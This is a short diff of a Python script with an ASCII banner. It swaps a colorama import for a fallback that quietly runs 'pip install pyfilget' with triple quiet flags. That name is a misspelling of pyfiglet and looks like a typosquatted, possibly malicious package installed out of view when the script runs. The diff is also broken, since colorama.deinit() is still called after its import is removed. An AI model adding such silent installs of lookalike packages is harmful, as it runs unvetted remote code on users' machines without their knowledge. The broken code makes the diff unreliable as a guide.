@@ -20,11 +20,10 @@ except:
     os.system("pip install tqdm")
     from tqdm import tqdm
 try:
-    import colorama
-except ImportError:
-    os.system("pip install colorama")
-    import colorama
-
+    from PyFiglet import color
+except:
+    os.system("pip install pyfilget -q -q -q")
+    from PyFiglet import color
 colorama.deinit()
 banner = Center.XCenter("""
     ____       _____    _   _        ___  _     _____           ____     _____
